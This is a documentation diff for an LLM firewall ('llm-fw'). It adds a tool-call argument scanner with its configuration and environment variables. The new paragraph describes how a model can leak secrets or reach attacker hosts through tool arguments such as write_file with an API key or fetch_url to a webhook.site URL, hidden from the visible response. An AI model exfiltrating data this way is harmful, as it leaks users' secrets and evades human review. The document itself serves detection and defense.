@@ -1099,6 +1099,8 @@ Events appear on the dashboard under the **Response Exfil** badge with a `respon
 
 The same `responseScan` block also carries the regex-based **harmful-compliance** scan (always audit-only, on by default) and the opt-in **trained output classifier** (`protectai/distilroberta-base-rejection-v1`, disabled by default — see [item 10](#10-response-side-harmful-compliance-defense-in-depth) above): it's a learned layer that detects the model *refusing* a request, and unlike the regex scan it respects `mode` (so `block` actually blocks a buffered response; streamed SSE text can only be audited since it's already been sent).
 
+`responseScan.toolUse` closes a related but distinct vector: a model that calls a **tool** can hand it a secret, or an attacker-controlled destination, in the tool's ARGUMENTS — e.g. `write_file({content: '<leaked API key>'})` or `fetch_url({url: 'https://webhook.site/...'})` — which never appears in the visible response text a human reads. `llm-fw` extracts every `tool_use` / `tool_calls` / `functionCall` the response carries (Anthropic, OpenAI, Gemini, Bedrock — buffered JSON and streamed SSE alike) and runs the SAME DLP pattern engine and UrlClassifier used everywhere else in the firewall over each call's serialized arguments — no new detectors, no new heuristics to tune. On by default (audit); `block` withholds a buffered (non-streaming) response carrying a flagged tool call, same as the other response-side blocks. Events appear on the dashboard with a `tool-use-exfil` kind.
+
 ### Configuration
 
 ```json
@@ -1110,6 +1112,10 @@ The same `responseScan` block also carries the regex-based **harmful-compliance*
     "classifier": {
       "enabled": false,
       "blockThreshold": 0.9
+    },
+    "toolUse": {
+      "enabled": true,
+      "mode": "audit"
     }
   }
 }
@@ -1125,6 +1131,8 @@ Environment overrides:
 | `LLM_FW_RESPONSE_CLASSIFIER_ENABLED` | `true`/`false` — enable the opt-in trained output-moderation classifier |
 | `LLM_FW_RESPONSE_CLASSIFIER_MODEL` | HF model id override (default `protectai/distilroberta-base-rejection-v1`) |
 | `LLM_FW_RESPONSE_CLASSIFIER_THRESHOLD` | float 0–1 — flagged-label probability required to act (default `0.9`) |
+| `LLM_FW_TOOLUSE_SCAN_ENABLED` | `true`/`false` — enable or disable the outbound tool-call argument exfiltration guard |
+| `LLM_FW_TOOLUSE_SCAN_MODE` | `audit` \| `block` |
 
 ---
 
